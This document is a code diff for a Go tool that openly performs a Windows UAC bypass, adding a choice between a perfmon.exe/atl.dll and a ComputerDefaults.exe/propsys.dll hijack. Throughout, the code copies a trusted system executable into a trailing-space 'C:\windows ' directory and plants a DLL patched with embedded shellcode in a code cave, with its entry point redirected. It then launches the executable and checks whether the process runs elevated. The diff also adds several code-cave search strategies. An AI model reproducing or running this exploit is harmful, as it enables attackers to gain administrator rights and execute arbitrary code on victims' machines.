@@ -2,6 +2,7 @@ package main
 
 import (
 	_ "embed"
+	"flag"
 	"fmt"
 	"log"
 	"os"
@@ -16,7 +17,43 @@ import (
 //go:embed atl.dll
 var atlDLL []byte
 
+//go:embed propsys.dll
+var propsysDLL []byte
+
+type BypassMethod struct {
+	Executable string
+	DLLName    string
+	DLLData    []byte
+	ProcessName string
+}
+
 func main() {
+	var method = flag.String("method", "perfmon", "Choose bypass method: 'perfmon' (uses atl.dll) or 'computerdefaults' (uses propsys.dll)")
+	flag.Parse()
+
+	var bypassMethod BypassMethod
+	
+	switch *method {
+	case "perfmon":
+		bypassMethod = BypassMethod{
+			Executable:  "perfmon.exe",
+			DLLName:     "atl.dll",
+			DLLData:     atlDLL,
+			ProcessName: "perfmon",
+		}
+		fmt.Println("Using perfmon.exe with atl.dll")
+	case "computerdefaults":
+		bypassMethod = BypassMethod{
+			Executable:  "ComputerDefaults.exe",
+			DLLName:     "propsys.dll", 
+			DLLData:     propsysDLL,
+			ProcessName: "ComputerDefaults",
+		}
+		fmt.Println("Using ComputerDefaults.exe with propsys.dll")
+	default:
+		log.Fatalf("Invalid method '%s'. Use 'perfmon' or 'computerdefaults'", *method)
+	}
+
 	windir := `C:\windows `
 	sys32dir := filepath.Join(windir, "system32")
 
@@ -28,74 +65,74 @@ func main() {
 		log.Fatalf("Failed to create directory %s: %v", sys32dir, err)
 	}
 
-	displacedDLLPath := filepath.Join(sys32dir, "atl.dll")
-	err := os.WriteFile(`\\?\`+displacedDLLPath, atlDLL, 0644)
+	displacedDLLPath := filepath.Join(sys32dir, bypassMethod.DLLName)
+	err := os.WriteFile(`\\?\`+displacedDLLPath, bypassMethod.DLLData, 0644)
 	if err != nil {
-		log.Fatalf("Failed to write embedded atl.dll: %v", err)
+		log.Fatalf("Failed to write embedded %s: %v", bypassMethod.DLLName, err)
 	}
 
-	legitPerfmonPath := filepath.Join(os.Getenv("SystemRoot"), "System32", "perfmon.exe")
-	newPerfmonPath := filepath.Join(sys32dir, "perfmon.exe")
+	legitExecutablePath := filepath.Join(os.Getenv("SystemRoot"), "System32", bypassMethod.Executable)
+	newExecutablePath := filepath.Join(sys32dir, bypassMethod.Executable)
 
-	perfmonBytes, err := os.ReadFile(legitPerfmonPath)
+	executableBytes, err := os.ReadFile(legitExecutablePath)
 	if err != nil {
-		log.Fatalf("Failed to read perfmon.exe: %v", err)
+		log.Fatalf("Failed to read %s: %v", bypassMethod.Executable, err)
 	}
 
-	if err := os.WriteFile(`\\?\`+newPerfmonPath, perfmonBytes, 0755); err != nil {
-		log.Fatalf("Failed to write perfmon.exe: %v", err)
+	if err := os.WriteFile(`\\?\`+newExecutablePath, executableBytes, 0755); err != nil {
+		log.Fatalf("Failed to write %s: %v", bypassMethod.Executable, err)
 	}
 	fmt.Println("Created directories and copied files.")
 
 	shellcode := getEmbeddedShellcode()
 	fmt.Printf("Using embedded shellcode (%d bytes)\n", len(shellcode))
 
-	fmt.Println("Patching atl.dll with debug/pe...")
+	fmt.Printf("Patching %s with debug/pe...\n", bypassMethod.DLLName)
 	
 	if err := patchDLLWithShellcode(`\\?\`+displacedDLLPath, shellcode); err != nil {
 		log.Fatalf("Failed to patch DLL: %v", err)
 	}
 
-	fmt.Println("Successfully patched atl.dll with new section.")
+	fmt.Printf("Successfully patched %s with new section.\n", bypassMethod.DLLName)
 
-	if _, err := os.Stat(`\\?\` + newPerfmonPath); err != nil {
-		log.Fatalf("Perfmon.exe not found at expected location: %v", err)
+	if _, err := os.Stat(`\\?\` + newExecutablePath); err != nil {
+		log.Fatalf("%s not found at expected location: %v", bypassMethod.Executable, err)
 	} else {
-		fmt.Println("Perfmon.exe found in trailing space directory")
+		fmt.Printf("%s found in trailing space directory\n", bypassMethod.Executable)
 	}
 	
 	if _, err := os.Stat(`\\?\` + displacedDLLPath); err != nil {
-		log.Fatalf("atl.dll not found at expected location: %v", err)
+		log.Fatalf("%s not found at expected location: %v", bypassMethod.DLLName, err)
 	} else {
-		fmt.Println("atl.dll found in trailing space directory")
+		fmt.Printf("%s found in trailing space directory\n", bypassMethod.DLLName)
 	}
 
-	perfmonInfo, _ := os.Stat(`\\?\` + newPerfmonPath)
-	atlInfo, _ := os.Stat(`\\?\` + displacedDLLPath)
-	fmt.Printf("Perfmon.exe size: %d bytes\n", perfmonInfo.Size())
-	fmt.Printf("atl.dll size: %d bytes\n", atlInfo.Size())
+	executableInfo, _ := os.Stat(`\\?\` + newExecutablePath)
+	dllInfo, _ := os.Stat(`\\?\` + displacedDLLPath)
+	fmt.Printf("%s size: %d bytes\n", bypassMethod.Executable, executableInfo.Size())
+	fmt.Printf("%s size: %d bytes\n", bypassMethod.DLLName, dllInfo.Size())
 
-	fmt.Println("\n[+] Executing perfmon.exe from trailing space directory [+]")
-	fmt.Printf("Executing: %s\n", newPerfmonPath)
+	fmt.Printf("\n[+] Executing %s from trailing space directory [+]\n", bypassMethod.Executable)
+	fmt.Printf("Executing: %s\n", newExecutablePath)
 	
-	cmd := exec.Command("powershell", "-c", "Start-Process", "'"+newPerfmonPath+"'")
+	cmd := exec.Command("powershell", "-c", "Start-Process", "'"+newExecutablePath+"'")
 	
 	if err := cmd.Start(); err != nil {
-		log.Fatalf("Failed to execute perfmon.exe: %v", err)
+		log.Fatalf("Failed to execute %s: %v", bypassMethod.Executable, err)
 	}
     time.Sleep(3 * time.Second)
 	
-	fmt.Println("\n[+] Checking perfmon.exe elevation status [+]")
-	err = checkPerfmonElevation()
+	fmt.Printf("\n[+] Checking %s elevation status [+]\n", bypassMethod.Executable)
+	err = checkProcessElevation(bypassMethod.ProcessName)
 	if err != nil {
-		fmt.Printf("Error checking perfmon elevation: %v\n", err)
+		fmt.Printf("Error checking %s elevation: %v\n", bypassMethod.ProcessName, err)
 	}
 	
 	fmt.Println("UAC bypass complete")
 }
 
-func checkPerfmonElevation() error {
-	psCommand := `Get-Process | Add-Member -Name Elevated -MemberType ScriptProperty -Value {if ($this.Name -in @('Idle','System')) {$null} else {-not $this.Path -and -not $this.Handle} } -PassThru | Where-Object {$_.Name -eq 'perfmon'} | Format-Table Name,Elevated -AutoSize`
+func checkProcessElevation(processName string) error {
+	psCommand := fmt.Sprintf(`Get-Process | Add-Member -Name Elevated -MemberType ScriptProperty -Value {if ($this.Name -in @('Idle','System')) {$null} else {-not $this.Path -and -not $this.Handle} } -PassThru | Where-Object {$_.Name -eq '%s'} | Format-Table Name,Elevated -AutoSize`, processName)
 	
 	cmd := exec.Command("powershell", "-c", psCommand)
 	output, err := cmd.Output()
@@ -107,18 +144,18 @@ func checkPerfmonElevation() error {
 	fmt.Printf("PowerShell elevation check result:\n%s", result)
 	lines := strings.Split(result, "\n")
 	for _, line := range lines {
-		if strings.Contains(strings.ToLower(line), "perfmon") {
+		if strings.Contains(strings.ToLower(line), strings.ToLower(processName)) {
 			if strings.Contains(strings.ToLower(line), "true") {
-				fmt.Println("SUCCESS: perfmon.exe is running elevated")
+				fmt.Printf("SUCCESS: %s is running elevated\n", processName)
 				return nil
 			} else if strings.Contains(strings.ToLower(line), "false") {
-				fmt.Println("perfmon.exe is running but NOT elevated")
+				fmt.Printf("%s is running but NOT elevated\n", processName)
 				return nil
 			}
 		}
 	}
 	
-	fmt.Println("⚠️  perfmon.exe process not found or elevation status unclear")
+	fmt.Printf(" %s process not found or elevation status unclear\n", processName)
 	return nil
 }
 
@@ -136,26 +173,19 @@ func patchDLLWithShellcode(dllPath string, shellcode []byte) error {
 	}
 	defer file.Close()
 
-	textSection := findSection(file, ".text")
-	if textSection == nil {
-		return fmt.Errorf("could not find .text section")
+	requiredSize := len(shellcode) + 10
+	fmt.Printf("Looking for code cave of at least %d bytes...\n", requiredSize)
+
+	// Try to find suitable section and code cave
+	sectionInfo, caveOffset := findBestCodeCave(file, requiredSize)
+	if sectionInfo == nil {
+		return fmt.Errorf("could not find suitable code cave for shellcode in any section")
 	}
 
-	fmt.Printf("Found .text section at RVA 0x%x, size: %d\n", textSection.VirtualAddress, textSection.Size)
+	fmt.Printf("Selected %s section at RVA 0x%x, size: %d\n", sectionInfo.Name, sectionInfo.VirtualAddress, sectionInfo.Size)
+	fmt.Printf("Found code cave at offset 0x%x in %s section\n", caveOffset, sectionInfo.Name)
 
-	textData, err := textSection.Data()
-	if err != nil {
-		return fmt.Errorf("failed to read .text section: %v", err)
-	}
-
-	caveOffset := findCodeCave(textData, len(shellcode)+10) 
-	if caveOffset == -1 {
-		return fmt.Errorf("could not find suitable code cave for shellcode")
-	}
-
-	fmt.Printf("Found code cave at offset 0x%x in .text section\n", caveOffset)
-
-	fileOffset := int(textSection.Offset) + caveOffset
+	fileOffset := int(sectionInfo.Offset) + caveOffset
 	
 	copy(originalBytes[fileOffset:], shellcode)
 	
@@ -176,7 +206,7 @@ func patchDLLWithShellcode(dllPath string, shellcode []byte) error {
 		return fmt.Errorf("could not find entry point in file")
 	}
 
-	shellcodeRVA := textSection.VirtualAddress + uint32(caveOffset)
+	shellcodeRVA := sectionInfo.VirtualAddress + uint32(caveOffset)
 	
 	fmt.Printf("Entry point at file offset 0x%x, shellcode RVA: 0x%x\n", entryPointFileOffset, shellcodeRVA)
 
@@ -194,16 +224,78 @@ func patchDLLWithShellcode(dllPath string, shellcode []byte) error {
 	return nil
 }
 
-func findSection(file *pe.File, name string) *pe.Section {
-	for _, section := range file.Sections {
-		if section.Name == name {
-			return section
+func findBestCodeCave(file *pe.File, minSize int) (*pe.Section, int) {
+	preferredSections := []string{".text", ".rdata", ".data", ".rsrc"}
+	
+	fmt.Printf("Analyzing sections for code caves...\n")
+	
+	for _, sectionName := range preferredSections {
+		section := findSection(file, sectionName)
+		if section != nil {
+			fmt.Printf("Checking %s section (RVA: 0x%x, Size: %d, Characteristics: 0x%x)\n", 
+				section.Name, section.VirtualAddress, section.Size, section.Characteristics)
+			
+			if offset := analyzeSection(section, minSize); offset != -1 {
+				return section, offset
+			}
 		}
 	}
-	return nil
+	
+	fmt.Printf("Preferred sections exhausted, checking all sections...\n")
+	for _, section := range file.Sections {
+		isPreferred := false
+		for _, preferred := range preferredSections {
+			if section.Name == preferred {
+				isPreferred = true
+				break
+			}
+		}
+		if isPreferred {
+			continue
+		}
+		
+		fmt.Printf("Checking %s section (RVA: 0x%x, Size: %d, Characteristics: 0x%x)\n", 
+			section.Name, section.VirtualAddress, section.Size, section.Characteristics)
+		
+		if offset := analyzeSection(section, minSize); offset != -1 {
+			return section, offset
+		}
+	}
+	
+	return nil, -1
 }
 
-func findCodeCave(data []byte, minSize int) int {
+func analyzeSection(section *pe.Section, minSize int) int {
+	data, err := section.Data()
+	if err != nil {
+		fmt.Printf("   Could not read %s section data: %v\n", section.Name, err)
+		return -1
+	}
+	
+	// Try different cave finding strategies
+	strategies := []struct {
+		name string
+		finder func([]byte, int) int
+	}{
+		{"consecutive zeros", findConsecutiveZeros},
+		{"sparse zeros", findSparseZeros},
+		{"padding pattern", findPaddingPattern},
+		{"end padding", findEndPadding},
+	}
+	
+	for _, strategy := range strategies {
+		if offset := strategy.finder(data, minSize); offset != -1 {
+			fmt.Printf("   Found cave using '%s' strategy at offset 0x%x\n", strategy.name, offset)
+			return offset
+		} else {
+			fmt.Printf("   No cave found using '%s' strategy\n", strategy.name)
+		}
+	}
+	
+	return -1
+}
+
+func findConsecutiveZeros(data []byte, minSize int) int {
 	consecutiveZeros := 0
 	for i, b := range data {
 		if b == 0 {
@@ -216,6 +308,80 @@ func findCodeCave(data []byte, minSize int) int {
 		}
 	}
 	return -1
+}
+
+func findSparseZeros(data []byte, minSize int) int {
+	// Look for areas with mostly zeros (80% or more)
+	windowSize := minSize
+	if windowSize > len(data) {
+		return -1
+	}
+	
+	for i := 0; i <= len(data)-windowSize; i++ {
+		zeroCount := 0
+		for j := i; j < i+windowSize; j++ {
+			if data[j] == 0 {
+				zeroCount++
+			}
+		}
+		
+		if float64(zeroCount)/float64(windowSize) >= 0.8 {
+			return i
+		}
+	}
+	return -1
+}
+
+func findPaddingPattern(data []byte, minSize int) int {
+	// Look for common padding patterns (0x00, 0xCC, 0x90)
+	patterns := []byte{0x00, 0xCC, 0x90}
+	
+	for _, pattern := range patterns {
+		consecutive := 0
+		for i, b := range data {
+			if b == pattern {
+				consecutive++
+				if consecutive >= minSize {
+					return i - consecutive + 1
+				}
+			} else {
+				consecutive = 0
+			}
+		}
+	}
+	return -1
+}
+
+func findEndPadding(data []byte, minSize int) int {
+	// Check if there's enough space at the end of the section
+	if len(data) < minSize {
+		return -1
+	}
+	
+	// Look for trailing padding
+	endStart := len(data) - minSize
+	zeroCount := 0
+	
+	for i := endStart; i < len(data); i++ {
+		if data[i] == 0 || data[i] == 0xCC {
+			zeroCount++
+		}
+	}
+	
+	if float64(zeroCount)/float64(minSize) >= 0.7 {
+		return endStart
+	}
+	
+	return -1
+}
+
+func findSection(file *pe.File, name string) *pe.Section {
+	for _, section := range file.Sections {
+		if section.Name == name {
+			return section
+		}
+	}
+	return nil
 }
 
 func rvaToFileOffset(file *pe.File, rva uint32) int {
